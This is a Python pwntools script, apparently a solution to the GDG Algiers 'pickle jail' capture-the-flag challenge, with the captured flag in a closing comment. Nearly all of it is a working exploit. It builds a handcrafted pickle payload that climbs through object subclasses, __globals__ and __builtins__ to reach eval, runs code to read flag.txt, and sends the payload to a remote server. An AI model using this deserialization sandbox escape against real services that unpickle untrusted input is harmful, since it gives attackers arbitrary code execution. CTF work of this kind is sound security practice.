from pwn import *

lepickle = b'\x80\x04' \
           b'Vempty\np6\n' \
           b'g6\nV__class__.__base__\n\x93p0\n' \
           b'(g6\nV__dict__.update\n\x93p1\n' \
           b'g1\n(((Vobj\ng0\nt\x32ttR' \
           b'g6\nVobj.__getattribute__\n\x93p2\n' \
           b'g1\n(((Vsc\ng6\nVobj.__subclasses__\n\x93)Rt\x32ttR' \
           b'g6\nVsc.__getitem__\n\x93p3\n' \
           b'g1\n(((Vi\ng2\n(g3\n(I100\ntRV__init__\ntRt\x32ttR' \
           b'g1\n(((Vgl\ng6\nVi.__globals__\n\x93t\x32ttR' \
           b'g6\nVgl.__getitem__\n\x93p4\n' \
           b'g1\n(((Vb\ng4\n(V__builtins__\ntRt\x32ttR' \
           b'g6\nVb.__getitem__\n\x93p5\n' \
           b'g1\n(((Ve\ng5\n(Veval\ntRt\x32ttR' \
           b'g6\nVe\n\x93(Vprint(open("flag.txt").read())\ntR.'

r = remote('jail.chal.ctf.gdgalgiers.com', 1300)

r.sendline(lepickle.hex().encode())

r.interactive() # CyberErudites{wOw_L3T$_CR0wn_THe_nEw_pIcKle_Ch4MP1On}
